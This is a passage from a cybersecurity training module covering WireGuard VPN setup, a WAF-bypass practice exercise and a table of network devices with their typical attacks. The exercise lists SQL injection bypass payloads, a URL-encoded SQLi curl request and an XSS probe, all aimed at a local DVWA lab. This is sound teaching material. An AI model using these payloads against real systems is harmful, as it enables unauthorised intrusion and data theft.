# Set up and test WireGuard VPN (modern, simple, secure)

# Install WireGuard:
sudo apt install wireguard -y

# Generate key pair:
wg genkey | tee /tmp/private.key | wg pubkey > /tmp/public.key
echo "Private key: $(cat /tmp/private.key)"
echo "Public key:  $(cat /tmp/public.key)"

# Create server configuration:
sudo cat > /tmp/wg-server.conf << EOF
[Interface]
PrivateKey = $(cat /tmp/private.key)
Address = 10.200.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = CLIENT_PUBLIC_KEY_HERE
AllowedIPs = 10.200.0.2/32
EOF

echo "WireGuard server config created at /tmp/wg-server.conf"
echo "Review the configuration:"
cat /tmp/wg-server.conf

# Test security of WireGuard:
# WireGuard doesn't respond to unauthenticated UDP packets
# This means it's invisible to scanners that don't have the public key
sudo nmap -sU -p 51820 localhost 2>/dev/null
echo "Nmap shows WireGuard as open|filtered - correct behaviour"
echo "WireGuard doesn't respond to unauthenticated probes"

# Clean up:
rm -f /tmp/private.key /tmp/public.key /tmp/wg-server.conf
```

### Exercise 5: WAF Bypass Practice (30 minutes)

```bash
# Practice WAF bypass techniques on intentionally vulnerable applications
# Use DVWA (Damn Vulnerable Web Application) or similar

# Install DVWA via Docker:
docker run -d -p 8080:80 vulnerables/web-dvwa 2>/dev/null || \
    echo "Docker not available - use online version at dvwa.co.uk"

# Test basic WAF bypass techniques:

# 1. SQL injection bypass (on SQLi page with WAF-like protection):
# Standard (might be blocked by simple filter): 
# ' OR 1=1--

# Bypass variants to try:
# ' OR 1=1-- -
# ' OR '1'='1
# ' OR 1=1#
# '||'1'='1
# ') OR ('1'='1

# 2. Test URL encoding bypass:
# Replace ' with %27, space with %20, = with %3D:
curl -s "http://localhost:8080/vulnerabilities/sqli/?id=1%27+OR+1%3D1--+&Submit=Submit" \
    -H "Cookie: PHPSESSID=abc; security=low"

# 3. Nikto - web server scanner (includes some WAF detection):
nikto -h http://localhost:8080 -output /tmp/nikto_results.txt
cat /tmp/nikto_results.txt | head -30

# 4. Detect if a WAF is present:
wafw00f http://localhost:8080 2>/dev/null || \
    python3 -c "
import urllib.request
try:
    r = urllib.request.urlopen('http://localhost:8080/?q=<script>alert(1)</script>')
    print('No WAF - XSS not blocked (status:', r.status, ')')
except Exception as e:
    print('Possible WAF or error:', e)
"
```

---

## 14. Module Summary

| Device | OSI Layer | Core Function | Key Attacks Against It | Key Security Control | OT/ICS Relevance |
|--------|-----------|---------------|------------------------|---------------------|------------------|
| **Hub** | 1 | Broadcast signal repeater | Passive sniffing (all traffic visible) | Replace with switch | Still present in legacy OT |
| **Switch (L2)** | 2 | MAC-based frame forwarding | MAC flooding, VLAN hopping, ARP spoofing | Port security, DAI, DHCP snooping | Dominant in industrial LANs |
| **Router** | 3 | IP-based packet forwarding | Route injection, BGP hijacking, default creds | Routing auth, ACLs, hardening | Zone boundary in OT |
| **L2 Switch** | 2 | MAC forwarding, single broadcast domain | VLAN hopping, MAC flooding | 802.1X, port security | OT device connectivity |
| **L3 Switch** | 2-3 | L2 + routing, wire-speed inter-VLAN | Route manipulation, ACL bypass | SVIs + ACLs, no substitute for NGFW | OT distribution layer |
| **Packet Filter** | 3-4 | IP/port-based stateless filtering | ACK scan bypass, fragmentation evasion | Upgrade to stateful | Legacy OT firewalls |
| **Stateful FW** | 3-4 | Connection state tracking | State table exhaustion, app-layer attacks blind | Application-layer inspection | IT-OT boundary firewalls |
| **NGFW** | 3-7 | App-aware, user-aware, SSL inspection | NGFW itself exploited (CVE-2024-3400) | Patch immediately, restrict management | Replacing legacy industrial firewalls |
| **IDS** | All | Passive traffic monitoring and alerting | Evasion (fragmentation, encryption, slow scan) | Tune rules, reduce false positives | OT protocol anomaly detection |
| **IPS** | All | Inline traffic blocking | False positive DoS, evasion techniques | Redundancy, bypass mode, regular tuning | Rare in OT due to reliability concerns |
| **Forward Proxy** | 7 | Client traffic control and filtering | C2 via allowed destinations (GitHub, GDrive) | TLS inspection, behavioural analysis | Engineering workstation internet access |
| **Reverse Proxy** | 7 | Backend server protection and TLS termination | Origin server bypass, proxy vulnerabilities | WAF integration, restrict origin access | OT HMI web interface protection |
| **Load Balancer** | 4-7 | Traffic distribution, redundancy | LB itself exploited (F5 CVE-2020-5902) | Patch, restrict management, HA configuration | Limited in OT |
| **VPN Gateway** | 3-7 | Encrypted remote access | Pre-auth RCE (CVE-2024-3400, Pulse 2019) | Patch urgently, MFA, restrict management | Critical for remote OT access |
| **WAF** | 7 | HTTP attack filtering | WAF bypass (encoding, fragmentation, origin bypass) | Defence-in-depth with secure code | OT HMI/web interface protection |
| **Modem** | 1-2 | ISP signal conversion | Default creds, firmware exploits, UPnP | Firmware updates, disable UPnP, change creds | ISP connectivity for OT remote sites |
| **Home Gateway** | 1-7 | All-in-one SOHO device | Default creds, UPnP, firmware (Mirai, VPNFilter) | Change creds, disable UPnP, update firmware | Remote worker VPN endpoints |

---

> **Next Module:** [Stage 1.7 — Wireless Networks](./stage-1.7-wireless-networks.md)  
> **Previous Module:** [Stage 1.5 — Core Protocols](./stage-1.5-core-protocols.md)  
> **Series Index:** [Full Roadmap](../../README.md)

---

*This document is part of the Cybersecurity × OT/ICS Security Full Roadmap series. All techniques are presented for educational purposes, authorised security research, and defensive security practice. Always obtain proper authorisation before testing any system.*